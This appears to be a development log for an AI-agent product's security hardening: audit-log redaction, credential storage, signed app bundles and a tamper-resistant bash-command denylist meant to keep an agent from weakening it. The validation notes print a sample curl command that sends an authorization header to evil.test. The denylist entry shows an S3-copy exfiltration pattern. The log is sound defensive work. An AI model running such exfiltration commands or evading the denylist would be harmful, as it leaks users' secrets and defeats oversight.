  pagination ("Load older events"), a per-row integrity badge (red rail + glyph **and** an
  accessible name, so the verdict is never colour-only), an assertive live-region summary, and
  credential-safe JSONL export via a pure exported `toJsonl` — the rows are already redacted
  server-side, so the exporter is a serializer and deliberately **not** a second redaction pass.
  The old client-side outcome pills were replaced by presets that write the *server* filter:
  filtering after paging made "Load more" fetch rows the pill then hid, and the count meaningless.

- **[SH-8] V4 validation (real gateway, `:10111`, `PERSONALCLAW_HOME=/private/tmp/sh8-home`).**
  57 genuine SEL events from gateway boot + real API calls. Page 1 (limit 5) → append 5 events →
  page 2 by cursor: disjoint, contiguous, nothing skipped. A hand-altered record (no re-sign)
  showed `integrity_ok:false` on exactly that row while `verify` returned
  `{checked:57, ok:false, tampered:1}`; the page rendered "Chain broken — 1 of 57 events altered"
  plus the per-row rail in **both themes**. "Load older events" took 50 → 57 and settled to
  "All 57 matching events shown." A planted `sk-ant-api03-…` key rendered as
  `curl -H 'Authorization: [REDACTED: credential]' https://evil.test` — still forensically
  useful, no secret. The real Export button produced `application/x-ndjson`, 3 lines, every line
  re-parsed (round-trip), tamper flag carried, 64-char `entry_hash` intact, no plaintext secret.
  Zero console errors/warnings. Only the secret-bearing record was synthesized (through the real
  `log_tool_invocation` writer — a genuine denied-bash event needs a live model); every other
  event was produced by driving the app.

- **[SH-8] Tests.** `tests/test_security_audit_api.py` (22) + `web/.../auditExport.test.ts` (6).
  Falsified three ways: dropping `_refuse_app` → `assert 200 == 403`; dropping `redact_event` →
  `the plaintext secret survived into the audit response`; swapping the anchor for a naive offset
  → `pages overlap: ['e0005', 'e0006', 'e0007', 'e0008', 'e0009']` (exactly the 5 concurrent
  appends). The precondition assertion in `test_integrity_is_computed_before_redaction` also
  fired under the redaction mutation, proving that test is not vacuous.

### 2026-08-15 — SH-1 (T1.1 / Design S1 / Contract C1) credential backend selector — DONE

- **[SH-1] DONE:** C1 lands in `config/loader.py`: `CredentialBackend = Literal["keychain",
  "dotenv"]`, `requested_credential_backend()` (intent), `credential_backend()` (**resolved
  outcome**), `keychain_available()`, `credential_backend_warning()`, plus the two chokepoints
  `save_credential` / `get_credential`. `[keychain] = ["keyring>=24"]` is a new optional extra;
  doctor reports the active backend on the CLI and through a new
  `security.credential_backend` probe. 26 new tests in `tests/test_credential_backend.py`.

**Reads are a UNION; writes are not.** The one design call worth recording. Writes go to the
ACTIVE backend only (falling back to `.env` 0600 on any keychain failure); reads consult **both**
stores, keychain first, whichever backend is active. The alternative — reads served only by the
active backend — loses secrets in a case that will actually happen: an install opts into the
keychain, and every credential still sitting in `.env` (SH-2's migration has not run yet) reads
as `""`. Falsification proved the point, see below.

**Fail-closed, measured in three places.** (1) `keyring` absent → `.env` 0600 + doctor warning.
(2) `keyring.backends.fail` (raises on every call) **and `keyring.backends.null`** are refused as
unusable. `null` is the dangerous one — `set_password` returns cleanly and the secret is *gone* —
so the test asserts the credential lands in `.env`, not merely that the selector said "dotenv".
(3) A `set_password` that raises falls back to `.env` 0600. Never a third location: the fallback
test asserts `_mode(.env) == 0o600` **and** `{p.name for p in home.iterdir()} == {".env"}`.

**Doctor reports the outcome, in both surfaces.** `cli_doctor._doctor_credentials()` (extracted
as a helper on the `_doctor_providers()` pattern so it is testable without running the whole
subprocess/network-touching `_doctor()`, whose auto-fix writes to the real home) and the
`security.credential_backend` CAPABILITY probe. Both call `credential_backend()` and share one
`credential_backend_warning()`. The probe's evidence is `backend` / `requested` /
`keychain_available` / `env_mode` — names, modes and states, never a value (asserted). It also
flags a group-readable `.env`, read-only: the repair happens on the next credential read.

**Deviations, with reasons.**
1. **No config field; the opt-in is `PERSONALCLAW_CREDENTIAL_BACKEND`.** T1.1's sibling T1.2/T1.3
   (SH-2) own the class-B `credential_keychain` gate, the consent migration and the Settings
   action. A config gate here would build that seam twice and force SH-2 to redefine it. So no
   `config.json` round-trip, no `_EDITABLE_CONFIG` entry, no baseline regeneration.
2. **Availability alone does not switch backends.** `keychain` must be *requested*. The plan's own
   lifecycle is opt-in → default-new-installs → migrate-on-consent; flipping on mere availability
   would silently split an existing install's secrets across two stores with no migration.
3. **The keychain key index lives inside the keychain**, one JSON entry (`__personalclaw_key_index__`)
   holding key NAMES. `keyring` has no portable enumeration API and `load_credentials()` must be
   able to list what the keychain holds. A sidecar file under the config dir would have needed a
   durability-inventory claim to be snapshot-safe; names travelling with their own secrets need none.
4. **`app_cli` had a second `.env` parser** (a private `_get_credential` feeding every app's setup
   `SetupContext`) — invisible to keychain-stored secrets. Deleted and routed through the loader
   (clean break). Asserted by a source test so it cannot come back as a shadow.
5. **`keyring` is NOT in `[dev]`/`[test]`.** CI never installs optional extras, and a test that
   passed only on a developer's machine would be a CI red in waiting. The no-keyring path is proven
   by a `sys.meta_path` import blocker; the keychain path by a stub module in `sys.modules`. Nothing
   in the suite touches a real OS keychain. `keychain_available()` is deliberately **uncached** so a
   blocked import takes effect immediately without a cache-reset hook.

**Falsification — four mutations, one of which reded NOTHING and found a real test gap.**
1. `_dotenv_save_credential` chmod `0o600` → `0o644`: **3 red.**
   `AssertionError: .env must be 0600, found 0o644` · `assert 420 == 384` ·
   `assert '0644' == '0600'` (the probe's `env_mode` evidence).
2. `cli_doctor._doctor_credentials` reports `requested_credential_backend()`: **1 red** —
   `assert '.env 0600' in '  credentials: 🔐 OS keychain (keyring)\n ⚠️  keychain requested but
   no usable OS keyring backend is available…'`. Exactly the intent-instead-of-outcome defect.
3. Probe reports the request (`"backend": requested_credential_backend()`): **1 red** —
   `assert 'keychain' == 'dotenv'`.
4. `_UNUSABLE_KEYRING_BACKENDS = ()` (adopt `fail`/`null`): **2 red**, both parametrisations.
5. 🔴 **`get_credential` made active-backend-EXCLUSIVE: 2 passed — reded NOTHING.** The union-read
   property was asserted only in the direction "keychain value survives switching back to dotenv",
   never "a `.env`-only value is readable while the keychain is ACTIVE" — which is the pre-migration
   state of every opt-in install. Test strengthened; re-running the same mutation now reds with
   `AssertionError: assert '' == 'from-dotenv'`. Recorded because a mutation that reds nothing is a
   finding, not a formality.
   Also found while mutating #1: `test_a_fail_or_null_keyring_backend_is_refused` checked the mode
   *after* a `get_credential` call, so `_dotenv_credentials()`'s permission repair was masking the
   write. The assertions are now ordered mode-before-read.

**Gate.** `make lint` clean (black 1684 files unchanged, isort, flake8, mypy 869 sources).
`tests/test_credential_backend.py` **26 passed**. Rails — `test_config_baseline`,
`test_config_roundtrip`, `test_inert_surface_baseline`, `test_portability`,
`test_durability_inventory`, `test_resilience_degraded_lint`, `test_resilience_doctor`,
`test_baseline_denylist_integrity`, `tests/security/`, `test_app_cli`, `test_auth_credentials`,
`test_sdk_cli`, `test_roadmap_dag_derived`, `test_mc1_remote_reachability` — **318 passed**.
Full suite `pytest tests/ -n 4`: **20401 passed, 30 skipped, 12 xfailed, 0 failed** (9m30s).
`tools/regen_dag_derived.py`: 640 atoms, 125 ready, 876 edges, no `regressed:` line; the derived
diff is SH-1 `todo`→`done`, the SH ready-frontier moving to SH-2, and SH `done` 3→4 / `todo` 6→5.
No `config.json` field ⇒ no `test_config_baseline` regeneration needed and none done. No `web/`
change: the Doctor panel renders capabilities generically from `probe.title`, and the `security`
card already exists, so the new row appears with no frontend edit. The real-home rail reported
`/Users/golani/.personalclaw unchanged` on every run.
### 2026-08-15 — SH-3 (S2 T2.1/T2.2/V2) signed app bundles verified before install — DONE

**The scheme decision.** Detached **Ed25519 signatures in minisign's on-wire format, over a
whole-tree digest manifest**. Rationale and every rejected alternative are recorded in
`docs/security/signing.md`:

- **Sigstore keyless — rejected.** It is the stronger supply-chain story (no long-lived key), but it
  moves the trust root from one in-tree public key to a certificate chain plus a transparency log, so
  verifying an app install would want network access — on a path that must be offline and
  deterministic, the same constraint that keeps the scanner LLM-free. Its recovery story is also
  worse for a solo maintainer ("generate a new keypair, ship the new `.pub`" is executable by one
  person), and it would bind the trust model to a CI identity provider, which is a key-distribution
  *policy* commitment this atom has no mandate to make. Still a reasonable later migration.
- **Signing `app.json` only — rejected, and worse than not signing.** It verifies, it renders "signed
  by PersonalClaw", and `scripts/setup.sh` — the file that executes as `setup.onInstall` — stays
  attacker-controlled. Signing half an artifact advertises trust the signature does not cover.
- **stdlib HMAC over `hashlib`/`hmac` — rejected by construction.** Symmetric MACs make the verifying
  key the signing key, so every user's machine would hold everything needed to forge a
  "signed by PersonalClaw" bundle. Asymmetric is a requirement here, not a preference.
- **PyNaCl — rejected** (a new wheel when `cryptography` was already transitively present).
  **Hand-rolled pure-Python Ed25519 — rejected outright** on a signature path.
- **minisign's scrypt-encrypted SECRET-key format — rejected.** The public-key and signature formats
  ARE minisign's (so `minisign -Vm` verifies what we write and `minisign -G` produces keys we read);
  parsing its encrypted secret key would mean shipping key derivation and passphrase handling for no
  security gain, when the real protection is "the seed lives in a password manager and a CI secret".
  `scripts/sign_app.py` reads a mode-0600 base64 `key_id || ed25519_seed`.

**What the signature covers.** `src/personalclaw/signing.py`. A signed bundle carries
`.pclaw-signature.sha256` (`pclaw-sig-v1` header, then a sorted `sha256  relpath` line for **every**
file) and `.pclaw-signature.sha256.minisig` over that file's exact bytes. Verification re-derives the
manifest from the tree on disk and requires **byte equality** — so modified, **added**, removed and
renamed files are all one comparison. The added-file case is the one a plain digest list misses,
because every listed digest still matches. Nothing is excluded but the two signature files: an
exclusion list would be an unsigned region inside a signed bundle, the same hole one level down.
Symlinks are **refused** rather than skipped, for that reason.

**Where it runs — the ordering is the control.** `apps/app_manager.py::_signature_gate`, at step 3 of
`install()` **and** `update()`, on the quarantined staged copy: before the content scan, before the
commit, before `setup.onInstall`. `update()` is wired deliberately — an update is a fresh fetch of
mutable content, so skipping it there would make "update" the way around signing. Ordering is
*measured*, not asserted: the test instruments the gate to record step order and whether the live app
dir existed at verify time, and a tampered bundle's `onInstall` marker file proves the payload never
executed.

**Refuse vs warn — decided deliberately (plan soul guardrail: no weakened default).** `invalid` is
**terminal and non-consentable**; `confirm=True` does not override it. Consent covers *risk*, and a
broken signature is not a risk a user is positioned to weigh — the artifact is not the bytes its
signature covers. `unsigned` stays installable at **community tier** (C2's graduated trust, never a
hard wall). `signed` raises a `community` origin to `official` — proven provenance buys exactly what
the curated registry already has — and never lowers a tier (`builtin` stays `builtin`, pinned by a
test). Every failure returns a reason: missing half, malformed base64, short block, unknown
algorithm, absent trusted comment, unknown key, non-verifying signature, tampered trusted comment,
manifest drift, and **a missing Ed25519 backend** — a signature that cannot be checked is refused,
not accepted.

**Surfaces.** `ScanReport` gained `signature: SignatureInfo` → `{state, signer, reason}`, defaulting
to `unsigned` so a report from a path that never verified cannot render "signed by".
`installConsent.tsx::SignatureRow` renders all three states on the same surface as the scan verdict
(provenance and content are different questions; showing one invites "it scanned clean" to be read as
"it's from who it says"). The signer identity is the **trust-store filename stem**, never a comment
inside the signature — an author cannot choose their own attribution.

**COHERENCE FIX (found while wiring the refusal).** The "should this open the consent panel" rule
existed as three copied `needsConsent || scan?.verdict === 'dangerous' || clientInstall` expressions
(`useGuardedInstall.ts`, and twice in `AppsSection.tsx`), plus two more copies of
`dangerous = scan?.verdict === 'dangerous'` driving modal copy and `disabledReason`. A second terminal
cause would have had to be remembered in five places, and the one that forgot would have offered
"Install anyway" on a tampered artifact. Replaced with `terminalRefusalReason()` +
`isBlockingResult()` — one predicate, five call sites.

**Tests.** `tests/security/test_app_signature.py`, 34 tests. The load-bearing class is
`TestSwapTheUnsignedHalf` (swap the payload / add an unlisted file / remove a signed file after
signing → refused), including a meta-assertion that builds the weak manifest-only check in-process
and proves it WOULD pass the swap, so nobody can later "simplify" verification down to `app.json` and
stay green. Tests import `scripts/sign_app.py` itself rather than a parallel test signer — a broken
verifier must not be agreeable to a sympathetic fixture.

**Falsified with 7 mutations, each reding at least one test** (shipped code restored after each):
unconditional `signed` → 24 red; manifest-only coverage → 9 red incl. *"the shipped verifier accepted
the swap the weak one accepts"*; verify-after-scan → 2 red incl. *"the scan ran after a terminal
signature refusal"*; always-true Ed25519 → 2 red; half-signature demoted to `unsigned` → 2 red; tier
elevation removed → 1 red; signer read from the bundle's own comment → 4 red.

**DEVIATION (dependency).** `cryptography>=42` promoted from the `oauth2` extra to a **declared core
dependency**. It was already present transitively (`pdfplumber` → `pdfminer.six` → `cryptography`),
so this adds **zero** install weight, and CI — which installs core deps but not optional extras —
already had it. Declaring it is the point: a signature-verification path resting on someone else's
transitive dep is how a security control silently disappears in a future bump. Same reasoning the
`argon2-cffi` comment already records for the password path.

**OWNER TASK 2 OUTSTANDING — not a blocker on this atom.** The production keypair is deliberately not
generated here: an agent must not mint the private key it would then hand over, and a checked-in
"example" private key is exactly the anti-pattern this atom exists to avoid. The trust store
(`src/personalclaw/trusted_keys/`, packaged via `pyproject.toml`, public halves only, asserted by
`test_no_private_key_material_is_committed`) therefore ships **EMPTY**. That is the safe direction:
unknown key → refused, unsigned unaffected, so shipped behaviour is unchanged until the owner runs
`scripts/sign_app.py gen-key --signer PersonalClaw --out-dir <dir>` and copies the `.pub` in. The
consequence: `done_when`'s *"signed first-party bundle shows 'signed by PersonalClaw'"* is proven
under an ephemeral key in tests, not against the real key, and the recovery note the plan's owner task
2 calls for is written in `docs/security/signing.md` §"Maintainer workflow". `SH-4` wires the release
pipeline and is the atom that makes real signed bundles exist.

**DISCOVERY (what the Ed25519 check uniquely buys).** Mutation 4 (always-true Ed25519) reded only 2
tests, not the whole tamper matrix — because content tampering is independently caught by the
digest-manifest byte comparison. The signature check's *unique* coverage is the wrong-key and
tampered-trusted-comment cases; the manifest comparison is what catches swapped bytes. Both layers
are needed and neither is redundant, but a future reader measuring "how much does the crypto catch"
should expect that split rather than read it as weak coverage.

### 2026-08-14 — SH-10 (Amendment T4.4) the Security panel renders the verified baseline — DONE

SH-6 built the verification; nothing showed it. The panel listed 112 patterns with no way to
tell a healthy instance from a drifted one, and counted the user's config list rather than what
that list actually adds.

- **Payload** — `GET /api/security/denied-commands`
  (`dashboard/handlers/core.py::api_security_denied_commands`) now returns, alongside the
  existing `builtin`/`user` arrays: a `baseline` block (`version`, `sha256`, enforced `count`,
  `verified`, `detail`) sourced from `verify_baseline_denylist()`, and `user_additions`.
- **`user_additions` is derived, not counted** — `len(denied_command_patterns()) - len(baseline)`.
  `len(config.security.denied_commands)` is the obvious implementation and it is wrong: a user
  entry equal to a built-in is deduped by `denied_command_patterns()` and widens nothing. Verified
  live: config `['aws s3 cp .* s3://.*', 'my-secret-tool .*', 'aws s3 cp .* s3://.*']` → 3 entries,
  `user_additions: 1`.
- **The indicator flips, and the identity shown stays the verified one** — with the packaged file
  diverged, `verified` goes `false` and `detail` names the divergence, while `version`, `sha256` and
  `count` keep reporting the baseline actually in force. A diverged file is reported, never adopted,
  so the panel must not start advertising the attacker's version.
- **Panel** (`web/src/pages/settings/SecurityPanel.tsx`) — the baseline chip's **role flips with the
  state**: `status` when it matches what shipped, `alert` when it does not (unrequested news that
  changes what the list below means). Both carry an explicit `aria-label` because `status`/`alert`
  take no name from content — without one the chip would be an unnamed live region. The baseline
  region stays read-only (asserted by role, as the *absence* of a control inside it, with the user
  row's Remove button as the vacuity guard).
- **Both reads went bare** — `securityStats` and `deniedCommands` dropped `.catch(() => null)`, and
  the panel branches on `error` into `LoadError`. This is the one surface where a swallowed read is
  worse than a blank one: an empty denylist and "nothing is blocked" are the same picture. The gate
  is `!s`, not `s === undefined`, because the settings hub shares the `settings:security` cache key
  and still persists a substituted `null` into `sessionStorage`.
- **Docs** — extended `docs/security/threat-model.md` (boundary 1) with **Baseline denylist
  integrity: anti-drift and anti-LLM-tamper, not anti-owner**: what the digest does catch (on-disk
  corruption, a partial write, an edit that changed patterns but not the digest, in-process mutation,
  and a *self-consistent* rewrite of both — the fingerprint is held in memory from import) and what
  it does not (the owner; anyone who can edit the installed package before startup). A matching
  bullet joined "What we deliberately don't defend against". `limitations.md` was left alone: this is
  a boundary with a control and a stated non-goal, not a known gap.
- **Tests** — `tests/test_baseline_denylist_integrity.py::TestSecurityPanelPayload` (6) and
  `web/src/pages/settings/securityBaselineState.test.tsx` (11).

**DEVIATION — fixed two swapped copy strings in the same file.** `SecurityPanel.tsx`'s two
`unavailableWhen` reasons were exactly transposed: the shell-denylist Add said "Enter a host first"
and the egress host Adds said "Enter a pattern first". Both land in `title`, so the wrong noun is
what a hover and a description read. One-word correction, no mechanism change, pinned by
`securityBaselineState.test.tsx` (falsified: re-swapping turns it red). Out of the atom's literal
scope, but leaving a wrong string in a file being edited for legibility would be the wrong trade.

**DISCOVERY — reading the panel writes SEL when the baseline has diverged.** The handler calls
`verify_baseline_denylist()`, which logs `baseline_denylist_tamper_attempt` on a diverged file with
no per-digest dedup on that path (unlike the unrecoverable-read path). Every panel load, including a
background revalidation, therefore appends a row while the file stays diverged. Kept deliberately —
an owner viewing a diverged baseline is an auditable event, and it is the same behaviour the periodic
doctor probe already has — rather than adding a second, non-logging status accessor that could drift
from the enforcing one. Documented in the handler docstring. If the row volume ever matters, the fix
belongs in `security.py`'s reporting guard, not in a parallel read path.

**DISCOVERY — a suite-wide `PERSONALCLAW_HOME` fails ~11 tests that are green without it.**
Measuring the baseline with `PERSONALCLAW_HOME` exported for the whole run produced 12 failures
across `test_portability`, `test_mcp_core`, `test_ephemeral_sessions` and
`test_harness_workflow_resume_audit`; the same four files pass 132/132 on the same commit with the
variable unset. The failures are the env var, not the tree. Recorded so the next session does not
inherit a phantom baseline.

### 2026-08-14 — SH-6 (Amendment T3.4) baseline denylist as packaged data — DONE

The baseline bash denylist is now a packaged, integrity-verified data file that heals
itself on read, and both enforcement paths load it from one source.

- **`src/personalclaw/baseline_denylist.json`** — `{version: 1, description, sha256,
  patterns[]}`, all 112 previously-in-code patterns byte-for-byte, digest
  `2b7db3c6…c6e872` (sha256 over the newline-joined patterns, so content *and* order are
  covered — first-match-wins ordering is part of the baseline).
- **`security.py`** — `_read_packaged_baseline()` reads and verifies the file at import
  and **raises** on a missing file, malformed JSON, an empty pattern list, or a digest
  that disagrees with the patterns. `BUILTIN_DENIED_COMMAND_PATTERNS` becomes the loaded
  copy; the verified tuple + its fingerprint are held as `_BASELINE_PATTERNS` /
  `_BASELINE_SHA256`. `baseline_denied_command_patterns()` re-asserts on every read: one
  sha256 over ~110 short strings on the fast path (silent), and on mismatch it heals the
  list **in place** from the snapshot, or re-reads the file if the snapshot itself was
  rebound. `denied_command_patterns()` then appends user patterns deduped against the
  baseline, so the result is always a superset in the baseline's original order.
- **SEL, two distinct kinds.** `baseline_denylist_reasserted` (outcome `healed`) fires
  when in-memory drift was repaired, carrying `restored_count`/`restored_sample`.
  `baseline_denylist_tamper_attempt` (outcome `rejected`) fires when a shrink was
  refused: the periodic re-verify found the packaged file no longer matching the
  fingerprint captured at import, or no verified source remained. A cold untampered read
  emits nothing; the unrecoverable case is reported once per distinct broken state
  (`_BASELINE_TAMPER_REPORTED`) rather than once per screened command.
- **Fail-closed everywhere.** After import the file is never consulted for *content* —
  deleting or rewriting it cannot shrink what is enforced. `verify_baseline_denylist()`
  reports a diverged file instead of adopting it; with no verified source left the effective
  set is the union of every copy seen, never a smaller one.
- **Periodic re-verify** — Doctor probe `security.baseline_denylist` (capability
  `security`, Tier.CAPABILITY) runs `verify_baseline_denylist()` off-loop and goes red on
  a diverged file while the verified baseline stays in force.
- **Shared source** — `guardrails/denylist.py` and the `/api/security/denied-commands`
  payload both call `baseline_denied_command_patterns()`; no module but `security.py`
  names the data file (asserted by a test), so the two enforcement paths cannot drift.
- **Both packaging surfaces** — `pyproject.toml` package-data *and*
  `personalclaw-backend.spec` `_backend_data()`; PyInstaller's import analysis cannot see
  a data file. Verified by building the wheel (`personalclaw/baseline_denylist.json`
  present) and by a test asserting both declarations.
- **Tests** — `tests/test_baseline_denylist_integrity.py`, 45 cases: the heal (clear,
  single-entry removal, reordering, rebound snapshot, no-source-left), the superset
  property over ~215 configs (every baseline entry echoed back one at a time, duplicates,
  five shadow-key shapes, 200 seeded random mixes), the identical-pattern no-shrink case,
  the periodic re-verify incl. a self-consistent file rewrite, the Doctor probe both ways,
  the shared-source rails, and a matching-behaviour regression matrix plus a pinned
  baseline digest.
- **Falsified twice.** Disabling the re-assert (returning the live list unchecked) turns 7
  tests red including every heal case; letting a user pattern equal to a baseline entry
  remove it turns the superset property test red, naming the offending config.

**DEVIATION (file location).** The amendment names
`src/personalclaw/security/baseline_denylist.json`, but `security` is a module, not a
package — that path cannot exist alongside `security.py`. The file ships at
`src/personalclaw/baseline_denylist.json`, the same package-root spot as
`model_pricing.json` / `model_tokens.json`.

**DEVIATION (`baseline_denylist_immutable` envelope).** The amendment's PATCH error
envelope was not added. `security.denied_commands` is the only config write surface and it
is additive by type, so the envelope would have had no reachable trigger — an inert control.
The removal-attempt path is instead covered by the tamper-attempt event on a rejected
shrink, plus a test proving shadow keys (`removed_denied_commands`,
`denied_commands_override`, `baseline_denied_commands`, `builtin_denied_commands`,
`allowed_commands`) are dropped at `load()` and change nothing. If SH-10's panel gains a
write path that could shrink the view, the envelope belongs there.

**DISCOVERY (what the hash does and does not buy).** The digest catches on-disk
corruption, a partial write, and an edit that changed the patterns but not the digest —
those fail at import rather than shrinking the set. Because the fingerprint is held in
memory from import onward, it also catches a *self-consistent* rewrite of both the patterns
and the digest, which a naive "hash the file against its own field" check cannot see. It
does **not** stop the owner of the machine: anyone who can rewrite the installed package
before the process starts owns the baseline. Anti-drift and anti-LLM-tamper, not
anti-owner — as the amendment states.

- **[2026-08-15][S4] SH-9 DELIVERABLE SHIPPED, ATOM BLOCKED (owner task 3).**
  `docs/security/review-scope.md` is written and reviewable: the five high-risk paths are the
  plan's own S4 list (webhook auth, app reverse-proxy token model, scanner bypasses, egress
  guard layering, inbound surfaces), each grounded in a module verified to exist — e.g.
  `dashboard/handlers/hooks.py::_verify_hook_token` (:182), `inbound/auth.py::peer_allowed`
  (:150), `net/policy.py::egress_policy_for` (:188), `supply_chain.py::SkillScanner` (:227),
  `token_auth.py::validate_token_with_app` (:482). Severity is graded by the boundary crossed
  rather than a numeric score; unresolved disputes publish as disputes; unpatched
  Critical/High is withheld entirely (no redacted teaser) until the fixing release.
  **BLOCKED, not done:** two of the three `done_when` clauses — *"scope approved by owner
  (owner task 3)"* and *"review executed or scheduled with a date"* — are owner decisions
  (commission a funded audit vs publish a structured self-audit, then approve scope and set a
  date; `SECURITY-HARDENING.md:111` files this as owner task 3). No agent can satisfy them,
  and marking the atom done would assert an approval that has not happened. The document's
  `## Approval and schedule` table carries all three boxes unchecked and the doc
  self-describes as a proposal until they are filled in. Status is `blocked` so a later tick
  does not re-derive the document.
  **DISCOVERY (fixed here, one line):** `docs/security/threat-model.md` cited
  `history.py: redact_credentials, redact_exfiltration_urls`; both actually live in
  `security.py` (:444 and :351) and `history.py` contains neither. Invisible to
  `test_docs_lint_baseline`, which only checks that the cited *file* exists — and
  `history.py` does. Corrected to `security.py` rather than left contradicting the new doc.

### OWNER RULING — `SH-4`'s ECOSYSTEM-TOOLING dependency is STRUCK; the atom already owns that work. 2026-08-28

`SH-4` carries `EXT:ECOSYSTEM-TOOLING:registry.json listings record signer identity`. Audited: **no
ECOSYSTEM-TOOLING atom adds a signer property.** The registry schema's authority is
`scratch/registry/validate_registry.py`'s `build_schema()` (the committed mirror is byte-compare-railed
against it). Measured directly: it sets `additionalProperties: false`, and the string `signer` **appears
nowhere in the file** — so a listing cannot carry one, and no atom would add it.

**But `SH-4`'s own `done_when` already assigns it:** *"registry validation script records signer per
listing."* The dep is pointing at the atom's own second clause.

**RULED: strike the dep.** `SH-3` is `done` and shipped what `SH-4` builds on — the signing-scheme decision,
`scripts/sign_app.py`, the in-tree public key and the Store's verify path. `SH-4` adds the `signer` property
to `build_schema()` (and the mirror follows via the byte-compare rail) as part of its own work. Nothing is
waiting on a sibling plan.

**What genuinely remains for `SH-4`, so the ruling does not overstate it.** Two things, and neither is the
struck dep. First, the release pipeline: `release.yml` has **eight** jobs
(`push`, `build`, `pypi`, `pypi-client`, `images`, `notes`, `website-follow`, `attest`), **every one
`ubuntu-latest`**, with **zero** `codesign` / `notarytool` / `notarize` occurrences and **no invocation of
`scripts/sign_app.py`** — so nothing signs bundles today. That
is `SH-4`'s own first clause, not a CI-RELEASE deliverable (macOS runners already exist in the fleet, so the
runner is not the gap). Second, `github.com/PersonalClaw/registry` does not exist — verified live,
`git ls-remote` returns *"Repository not found"* — which is an **owner action**, and per `ET-4`'s note it
must be created only after `ET-4a`'s filename rename is on `main` (it is).


#### The general principle this applies

**An `EXT:` dependency that points at nobody is not a dependency — it is unassigned work inside the atom.**
`EXT:` deps are prose, nothing machine-checks them, and several were written as if a sibling plan would
eventually decompose the capability they name. When no sibling atom ever does, the atom sits `todo` forever
waiting on a plan that is not coming. The test is simple: *does any atom own the thing this dep names?* If
not, and the atom's own `done_when` already describes it, the dep is redundant and gets struck. If not, and
nothing describes it, it gets **filed** — not left as a dep. Either way it stops being a phantom blocker.

Two atoms this week were parked exactly this way (`MC-6`, which owes its own `sound` field, and this one).
Four more were found by a read-only audit of the 29 `EXT:`-only atoms.
